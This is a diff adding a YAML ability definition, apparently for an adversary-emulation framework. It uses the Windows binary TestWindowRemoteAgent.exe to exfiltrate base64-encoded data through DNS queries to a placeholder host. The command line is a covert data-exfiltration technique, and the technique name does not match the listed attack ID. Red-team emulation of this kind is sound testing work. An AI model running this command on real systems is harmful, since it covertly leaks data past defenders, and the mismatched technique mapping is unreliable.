@@ -1,0 +1,24 @@
+- id: 579400c0-c370-12f1-ae73-4a95273193e8
+  name: TestWindowRemoteAgent.exe - Sends DNS query for open connection to any host,
+    enabling exfiltration over DNS
+  description: Sends DNS query for open connection to any host, enabling exfiltration
+    over DNS
+  tactic: exfiltration
+  technique:
+    attack_id: T1048
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com
+          -p 8000
+  singleton: false
+  privilege: User
+  repeatable: true
+  buckets:
+  - exfiltration
+  version: '1.0'
+  author: Onat Uzunyayla
+  created: '2023-08-21'
+  modified: '2023-08-21'
+  operating_system: Windows All Versions
